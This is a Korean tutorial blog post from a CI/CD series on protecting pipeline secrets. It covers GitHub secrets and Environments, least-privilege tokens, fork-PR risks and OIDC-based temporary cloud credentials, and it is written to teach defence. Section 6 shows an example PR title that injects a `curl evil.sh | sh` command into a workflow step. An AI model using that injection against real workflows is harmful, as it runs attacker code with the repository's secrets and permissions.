---
# 📌 기본 메타데이터
title: '풀스택 개발자를 위한 CI/CD 7강 — 시크릿, 환경 분리, OIDC'
date: '2026-09-17'
category: 'devops'
tags: ['CI/CD', 'Security', 'OIDC', 'Secrets']
description: '파이프라인은 조직에서 가장 강력한 자동화 주체입니다. 비밀값의 올바른 위치, GitHub 시크릿과 변수, Environments 승인, GITHUB_TOKEN 최소 권한, 스크립트 인젝션과 포크 PR, 그리고 장기 자격 증명을 없애는 OIDC를 다룹니다.'

# 💬 옵션 필드
draft: false
series: '풀스택 개발자를 위한 CI/CD'
seriesOrder: 7

# 📚 SEO용
keywords: ['GitHub Actions 시크릿', 'Environments', '환경 분리', 'GITHUB_TOKEN', '최소 권한', '스크립트 인젝션', 'pull_request_target', 'OIDC', '시크릿 유출']
---
# 풀스택 개발자를 위한 CI/CD 7강 — 시크릿, 환경 분리, OIDC

> 풀스택 개발자를 위한 CI/CD 시리즈 · 중급 7/13

파이프라인은 서버, 레지스트리, 클라우드, DB에 접근할 수 있는 **조직에서 가장 강력한 자동화 주체**입니다. 그래서 공격자에게도 가장 매력적인 목표입니다. 이번 강의에서는 비밀값을 안전하게 다루고, 환경을 분리하고, 장기 자격 증명 자체를 없애는 OIDC까지 다룹니다.

## 1. 비밀값은 어디에 있어야 하나

| 위치 | 적합 여부 |
|---|---|
| 소스 코드, 커밋된 `.env` | ❌ 절대 안 됨. 이력에 영원히 남음 |
| Docker 이미지 | ❌ 이미지를 받는 모든 사람이 볼 수 있음 |
| 워크플로 YAML에 평문 | ❌ 저장소 읽기 권한만 있어도 보임 |
| CI 시크릿 저장소 | ✅ 파이프라인에서 쓰는 값 |
| 서버의 권한 제한된 파일 | ✅ 런타임 값 (권한 600, 배포 계정 소유) |
| 시크릿 매니저 (Vault, AWS Secrets Manager 등) | ✅ 규모가 커질수록 권장 |

실수로 커밋했다면 **커밋을 지우는 것보다 값을 교체(rotate)하는 것이 먼저**입니다. 공개 저장소에 올라간 키는 몇 분 안에 자동 수집기에 의해 수집된다고 가정해야 합니다.

## 2. GitHub의 시크릿과 변수

### 범위

| 범위 | 설정 위치 | 용도 |
|---|---|---|
| Organization | 조직 설정 | 여러 저장소가 공유하는 값 (선택한 저장소에만 허용 가능) |
| Repository | 저장소 설정 | 저장소 전체에서 쓰는 값 |
| Environment | 저장소 → Environments | 특정 환경(production 등)의 job에서만 쓰는 값 |

같은 이름이면 **Environment > Repository > Organization** 순으로 우선합니다.

### secrets와 vars

```yaml
env:
  API_URL: ${{ vars.API_URL }}             # 민감하지 않은 설정
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}  # 민감한 값
```

- `vars`는 로그에 그대로 보입니다. URL, 리전, 기능 플래그처럼 공개돼도 되는 값에 씁니다.
- `secrets`는 로그에 출력되면 `***`로 가려집니다(masking).

### 마스킹의 한계

마스킹은 **정확히 같은 문자열**만 가립니다. 다음 경우에는 새어 나갈 수 있습니다.

- 값을 base64로 인코딩하거나 일부만 잘라 출력한 경우
- 여러 줄로 된 값(인증서, JSON)의 일부가 출력된 경우
- 파일로 쓴 뒤 그 파일을 아티팩트로 업로드한 경우

실행 중에 만든 비밀값(예: 발급받은 토큰)은 직접 마스킹을 등록합니다.

```bash
TOKEN=$(./issue-token.sh)
echo "::add-mask::$TOKEN"
```

**원칙: 시크릿은 출력하지 않는다.** 디버깅할 때도 길이나 존재 여부만 확인합니다.

## 3. Environments: 환경 분리와 승인

저장소 Settings → Environments에서 `staging`, `production`을 만들고 보호 규칙을 겁니다.

| 보호 규칙 | 효과 |
|---|---|
| **Required reviewers** | 지정한 사람이 승인해야 job이 시작됨 |
| **Wait timer** | 지정 시간 대기 후 시작 (예: 스테이징 관찰 시간) |
| **Deployment branches and tags** | `main`이나 `v*` 태그에서만 이 환경에 배포 가능 |
| **Prevent self-review** | 배포를 트리거한 사람은 승인할 수 없음 |

```yaml
jobs:
  deploy-staging:
    needs: image
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    steps:
      - run: ./deploy.sh
        env:
          HOST: ${{ secrets.DEPLOY_HOST }}      # staging 환경의 값

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment:
      name: production                         # 승인 대기
      url: https://app.example.com
    steps:
      - run: ./deploy.sh
        env:
          HOST: ${{ secrets.DEPLOY_HOST }}      # production 환경의 값
```

같은 `secrets.DEPLOY_HOST`라도 job이 속한 환경에 따라 다른 값이 들어갑니다. 코드는 같고 설정만 다른 구조입니다. **운영 시크릿을 production 환경에만 등록**하면, 보호 규칙을 통과하지 않은 job은 운영 비밀값에 접근할 수 없습니다.

이 구성이 1강에서 말한 **Continuous Delivery**입니다. 스테이징까지 자동, 운영은 승인 후 배포입니다. Environments 화면에서는 환경별 배포 이력도 볼 수 있습니다.

## 4. 빌드 시점 값과 실행 시점 값

풀스택 앱의 설정은 성격에 따라 들어가는 시점이 다릅니다.

| 종류 | 예시 | 주입 시점 | 위치 |
|---|---|---|---|
| 공개 빌드 설정 | 기능 플래그 기본값 | 빌드 | `vars` → build-arg |
| 공개 런타임 설정 | API 경로, 사이트 URL | 실행 | 서버 환경변수 |
| 비밀 런타임 값 | DB 비밀번호, JWT 서명 키 | 실행 | 서버의 `.env` 또는 시크릿 매니저 |
| 배포용 자격 증명 | SSH 키, 레지스트리 토큰 | 파이프라인 실행 중 | CI 시크릿 |

**비밀값은 절대 빌드 시점에 넣지 않습니다.** `--build-arg`로 넘긴 값은 이미지 메타데이터에 남을 수 있습니다. 빌드 중에 꼭 비밀값이 필요하다면(비공개 npm 레지스트리 토큰 등) BuildKit의 secret mount를 씁니다.

```dockerfile
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc npm ci
```

```yaml
- uses: docker/build-push-action@v6
  with:
    secrets: |
      npmrc=${{ secrets.NPMRC }}
```

secret mount는 해당 `RUN` 동안에만 파일이 존재하고 레이어에 남지 않습니다.

## 5. GITHUB_TOKEN과 최소 권한

워크플로마다 자동 발급되는 `GITHUB_TOKEN`은 job이 끝나면 만료됩니다. 권한은 워크플로나 job 단위로 명시합니다.

```yaml
permissions: {}              # 워크플로 기본값: 아무 권한도 없음

jobs:
  test:
    permissions:
      contents: read         # 코드 읽기만
  image:
    permissions:
      contents: read
      packages: write        # 이미지 push
  release:
    permissions:
      contents: write        # 태그와 릴리스 생성
```

저장소/조직 설정에서 **워크플로 기본 권한을 읽기 전용**으로 바꿔 두면, 권한을 명시하지 않은 워크플로도 안전한 기본값을 갖습니다.

## 6. 스크립트 인젝션

PR 제목, 브랜치 이름, 이슈 본문은 **외부 사용자가 조작할 수 있는 값**입니다. 이것을 `run`에 직접 넣으면 명령이 주입됩니다.

```yaml
# ❌ 위험: PR 제목이 `"; curl evil.sh | sh; echo "` 라면?
- run: echo "PR 제목: ${{ github.event.pull_request.title }}"
```

`${{ }}`는 셸이 실행되기 **전에** 문자열로 치환되기 때문에, 조작된 제목이 그대로 셸 코드가 됩니다.

```yaml
# ✅ 안전: 환경변수로 전달하면 셸이 값을 데이터로 취급
- run: echo "PR 제목: $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

**규칙: `run` 안에 `${{ }}`로 외부 입력을 직접 넣지 말고, 항상 `env`를 거친다.** 2강부터 시크릿을 `env`로 넘긴 이유가 이것입니다.

## 7. 포크 PR과 pull_request_target

- `pull_request` 이벤트는 포크에서 온 PR에 **시크릿을 주지 않고**, 토큰도 읽기 전용입니다. 모르는 사람의 코드가 실행되기 때문입니다.
- `pull_request_target`은 **대상 저장소의 권한과 시크릿**으로 실행됩니다. PR에 라벨을 붙이는 정도의 작업을 위한 이벤트입니다.

`pull_request_target`에서 **PR의 코드를 체크아웃해 실행하면**, 외부인이 저장소의 시크릿과 쓰기 권한을 가진 채로 임의 코드를 실행하게 됩니다. 실제 보안 사고가 반복적으로 발생한 패턴이므로, 이 이벤트는 PR 코드를 실행하지 않는 작업에만 씁니다.

## 8. OIDC: 장기 자격 증명 없애기

지금까지의 방식은 클라우드 액세스 키 같은 **장기 자격 증명**을 시크릿에 저장했습니다. 이 키는 유출되면 교체할 때까지 계속 유효합니다.

**OIDC(OpenID Connect)** 방식은 다음과 같이 동작합니다.

```
1. 워크플로 실행 → GitHub OIDC 공급자가 서명된 ID 토큰(JWT) 발급
   토큰 내용: "이 토큰은 my-org/my-app 저장소의 production 환경 job에서 발급됨"
2. 워크플로가 이 토큰을 클라우드(AWS STS 등)에 제출
3. 클라우드가 서명을 검증하고, 미리 정한 신뢰 조건과 비교
4. 조건이 맞으면 짧은 수명(보통 1시간 이내)의 임시 자격 증명 발급
```

저장할 비밀값이 아예 없고, 토큰은 **특정 저장소·브랜치·환경에서만** 쓸 수 있게 제한됩니다.

### AWS 예시

클라우드 쪽에서는 GitHub을 OIDC 공급자로 등록하고, IAM 역할의 신뢰 정책에 조건을 겁니다.

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:my-org/my-app:environment:production"
        }
      }
    }
  ]
}
```

`sub` 조건이 핵심입니다. 이 역할은 **`my-org/my-app` 저장소의 `production` 환경 job에서만** 사용할 수 있습니다. 다른 저장소나 PR에서는 토큰을 받아도 역할을 쓸 수 없습니다.

워크플로 쪽은 다음과 같습니다.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    permissions:
      id-token: write        # OIDC 토큰 발급 권한
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/github-deploy-prod
          aws-region: ap-northeast-2
      - run: aws sts get-caller-identity
```

GCP(Workload Identity Federation), Azure(Federated Credentials), HashiCorp Vault도 같은 방식을 지원합니다. 9강의 keyless 이미지 서명도 이 OIDC 토큰을 이용합니다.

**`sub` 조건을 와일드카드(`repo:my-org/*`)로 넓게 잡지 않도록** 주의합니다. 조건이 넓을수록 OIDC의 장점이 사라집니다.

## 9. 시크릿 유출 예방

- **Secret scanning과 push protection**: GitHub이 알려진 형식의 키가 push되는 것을 감지하고 차단합니다. 저장소 보안 설정에서 켭니다.
- **gitleaks**: 로컬 훅과 CI에서 비밀값 패턴을 검사합니다.
- **정기 교체**: 장기 자격 증명은 교체 주기를 정하고, 교체 절차를 문서화합니다. 교체가 두려운 키는 이미 관리 실패 상태입니다.
- **최소 범위**: 토큰은 필요한 저장소, 필요한 권한, 필요한 기간으로만 발급합니다.

## 10. 정리

- 비밀값은 코드와 이미지에 넣지 않고, CI 시크릿이나 서버의 보호된 파일, 시크릿 매니저에 둡니다.
- Environments로 환경별 시크릿과 승인 규칙을 분리하면 Continuous Delivery가 완성됩니다.
- 비밀값은 실행 시점에 주입하고, 빌드 중 필요하면 BuildKit secret mount를 씁니다.
- `GITHUB_TOKEN`은 최소 권한으로, 외부 입력은 항상 `env`를 거쳐 사용합니다.
- OIDC를 쓰면 장기 자격 증명 없이 저장소·환경 단위로 제한된 임시 권한을 얻습니다.

## 확인 문제와 해설

**Q1.** 운영 DB 비밀번호를 Repository 시크릿에 등록했습니다. 어떤 문제가 있을까요?

> 저장소의 모든 워크플로와 job이 접근할 수 있어, 승인 규칙을 거치지 않은 job도 운영 비밀값을 쓸 수 있습니다. production Environment 시크릿으로 옮겨야 합니다.

**Q2.** 다음 step의 문제는 무엇인가요? `run: git checkout ${{ github.head_ref }}`

> 브랜치 이름은 PR 작성자가 정할 수 있어 스크립트 인젝션이 가능합니다. `env: HEAD_REF: ${{ github.head_ref }}`로 넘기고 `"$HEAD_REF"`로 사용해야 합니다.

**Q3.** OIDC 신뢰 조건을 `repo:my-org/my-app:*`로 설정하면 어떤 위험이 있나요?

> 운영 역할을 모든 브랜치와 PR에서 사용할 수 있게 됩니다. 검토되지 않은 브랜치의 코드가 운영 권한을 얻을 수 있으므로 환경이나 브랜치 단위로 좁혀야 합니다.
